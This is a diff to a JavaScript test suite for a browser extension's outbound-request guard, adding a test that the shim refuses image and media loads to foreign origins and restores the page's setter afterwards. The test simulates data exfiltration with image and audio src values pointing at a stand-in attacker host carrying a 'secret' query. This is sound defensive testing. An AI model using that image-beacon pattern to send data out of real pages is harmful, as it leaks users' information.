@@ -23,7 +23,9 @@ test("the page-side fetch() call exists only in pageFetch (net.js) and in the gu
   const close = net.indexOf("\nexport ", open + 10) > 0 ? net.indexOf("\n}\n", open) : net.length;
   const inside = net.slice(open, close);
   const hits = [...net.matchAll(/(^|[^.\w])fetch\(/g)].map(m => m.index || 0);
-  assert.ok(hits.length > 0 && hits.every(i => i > open && i < close + 1), "every fetch( in net.js is inside pageFetch");
+  // probeGuard fires one fetch at an unroutable host from a string, to prove the interceptor is live; it sends nothing of the person's.
+  const pOpen = net.indexOf("async function probeGuard"), pClose = net.indexOf("\n}\n", pOpen);
+  assert.ok(hits.length > 0 && hits.every(i => (i > open && i < close + 1) || (i > pOpen && i < pClose)), "every fetch( in net.js is inside pageFetch (or the guard's probe)");
   assert.match(inside, /writeGate|PASS/, "pageFetch checks the pass");
 });
 
@@ -153,4 +155,30 @@ test("the shim's allow list cannot be tampered with after install, and under the
   vm.runInContext("window.__vyreWrites = true;" + (await import("./extension/shared/outbound.js")).guardInstall, plain);
   assert.equal(plain.open(), "opened");
   assert.doesNotThrow(() => new plain.Worker("x"));
+});
+
+test("under the eval guard an image or media src to another origin is refused by the shim, an allowed one loads, and restore puts the setter back", async () => {
+  const vm = await import("node:vm");
+  const { guardInstallWrites, guardCollect } = await import("./extension/shared/outbound.js");
+  const loaded = /** @type {string[]} */ ([]);
+  class Img { set src(v) { loaded.push(String(v)); } get src() { return loaded[loaded.length - 1] || ""; } }
+  class Media { set src(v) { loaded.push(String(v)); } get src() { return ""; } }
+  const win = /** @type {any} */ ({
+    location: { origin: "https://app.example", href: "https://app.example/w", host: "app.example" },
+    fetch: async () => ({ ok: true }), XMLHttpRequest: class { open() {} send() {} }, navigator: { sendBeacon: () => true },
+    HTMLFormElement: class { submit() {} requestSubmit() {} }, Node: class {}, Element: class {}, document: { addEventListener() {}, removeEventListener() {} },
+    HTMLImageElement: Img, HTMLMediaElement: Media, __vyreAllow: ["https://api.example"], URL, Promise, TypeError, Error, Array, String, Object,
+  });
+  win.window = win;
+  vm.createContext(win);
+  vm.runInContext(guardInstallWrites, win);
+  const d = new win.HTMLImageElement(); d.src = "https://evil.example/p.gif?d=secret";
+  const a = new win.HTMLMediaElement(); a.src = "https://evil.example/a.mp3";
+  d.src = "https://api.example/ok.gif"; d.src = "/local.gif";
+  assert.deepEqual(loaded, ["https://api.example/ok.gif", "/local.gif"]);
+  const blocked = vm.runInContext(guardCollect, win);
+  assert.equal(blocked.filter((/** @type {any} */ b) => /evil\.example/.test(b.url)).length, 2);
+  // guardCollect took the shim off
+  d.src = "https://evil.example/after"; // the guard is off: the page's own setter again
+  assert.equal(loaded[loaded.length - 1], "https://evil.example/after");
 });
